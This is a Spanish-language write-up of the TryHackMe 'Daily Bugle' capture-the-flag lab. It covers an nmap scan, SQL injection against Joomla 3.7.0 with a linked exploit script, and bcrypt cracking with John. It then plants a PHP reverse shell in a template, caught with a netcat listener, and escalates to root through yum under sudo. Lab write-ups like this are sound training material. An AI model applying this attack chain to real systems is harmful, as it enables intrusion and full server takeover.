---
title: Daily Bugle
author: m4rtc
categories: [Tryhackme, Dificil]
tags: [tryhackme-dificil]
---
![inicio](/assets/tryhackme/DailyBugle/inicio.png)
> <h7>Objetivo:Comprometer una cuenta de Joomla CMS a traves de SQLi, practique el descifrado de hashes y aumente sus privilegios aprovechando yum</h7>
<h3><center><ins>Scaneo y enumeracion con nmap</ins></center></h3>
<p>Primero realizamos un scaneo sigiloso con nmap y ennumeramos los directorios de http con un script.</p>
<pre>nmap -sS -sV -n --script=http-enum 10.10.200.133</pre>
![1-nmap](/assets/tryhackme/DailyBugle/1-nmap.png)
<p>La informacion más relavante seria los directorios que contiene el puerto 80, y la version de Joomla 3.7.0 .<br/>Por simple deduccion podemos decir que debemos explotar por el servicio Joomla 3.7.0</p>

<h3><center><ins>Explotacion por SQL con joomblah</ins></center></h3>
Copiamos el contenido de este repositorio [joomblah.py](https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py) y lo pegamos en nuestro nano. 
<pre>nano joomblah.py</pre>
<p>Una vez copiado el script, procedemos ah usarlo</p>
<pre>joomblah.py http://10.10.200.133/</pre>
![2-joomblah](/assets/tryhackme/DailyBugle/2-joomblah.png)
<p>Obtendremos:<br/>-usuario: Jonah<br/>-hash: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm</p>

<h3><center><ins>Crackear el hash</ins></center></h3>
<p>Usaremos hashid, para saber el tipo de hash que conseguimos</p>
<pre>hashid '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'</pre>
<p>El tipo de hash es un bycrypt</p>
<br/>
<p>Ponemos el hash en formato txt, con el nombre contraseña.txt</p>
<pre>john contraseña.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt</pre>
![3-jhon](/assets/tryhackme/DailyBugle/3-john.png)
![4-jhon](/assets/tryhackme/DailyBugle/4-john.png)
<p>Obtendremos la contraseña: spiderman123</p>

<h3><center><ins>Reverse Shell</ins></center></h3>
<p>Abrimos en el navegador y nos logeamos.<br/>usuario: Jonah<br/>contraseña: spiderman123</p>
![5-login](/assets/tryhackme/DailyBugle/5-login.png)
<p>Nos dirigimos a templates, luego a Beez3</p>
![6-templates](/assets/tryhackme/DailyBugle/6-templates.png)
Vamos a index.php en donde reemplasaremos el codigo por nuestro reverse shell [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

<p>Abrimos un puerto de escucha</p>
<pre>nc -lnvp 4444</pre>
<p>Procedemos a activar el reverse shell dandole click en templete preview. Posteriormente tendremos conexion con el netcat</p>
![9-conexion](/assets/tryhackme/DailyBugle/9-conexion.png)

<h3><center><ins>Escalada de Privilegios</ins></center></h3>
<p>Nos dirijimos al directorio del sitio web donde se encuentan los archivo de configuracion</p>
![10-usuario1](/assets/tryhackme/DailyBugle/10-usuario1.png)
![11-usuario2](/assets/tryhackme/DailyBugle/11-usuario2.png)
<pre>cat configuration.php</pre>

![12-html](/assets/tryhackme/DailyBugle/12-html.png)
<p>Encontramos una contraseña(root): nv5uz9r3ZEDzVjNu</p>
<br/>
<p>Primero probamos con el usuario raiz y tenemos una respuesta negativa</p>
![13-probando](/assets/tryhackme/DailyBugle/13-probando.png)
<p>Luego probamos con el usuario jjameson y obtuvimos una respuesta positiva</p>
<pre>su jjameson</pre>

![14-falg1](/assets/tryhackme/DailyBugle/14-falg1.png)
<p>Encontramos una flag en user.txt</p>
<br/>
<pre>sudo -l</pre>
<p>Podemos ver que tenemos acceso root con /yun</p>
Nos dirigimos a [gtfobins/yun/root](https://gtfobins.github.io/gtfobins/yum/#sudo)
y copiamos el script y lo pegamos.
![15-yun](/assets/tryhackme/DailyBugle/15-yun.png)
<p>Listo ya tenemos privilegios root</p>
![16-final](/assets/tryhackme/DailyBugle/16-final.png)
<p>Obtuvimos una flag en root.txt</p>
<marquee behavior="alternate" direction="left">FIN :)</marquee>
![que miras sapo](/assets/tryhackme/DailyBugle/naruto-ramen.gif)
---
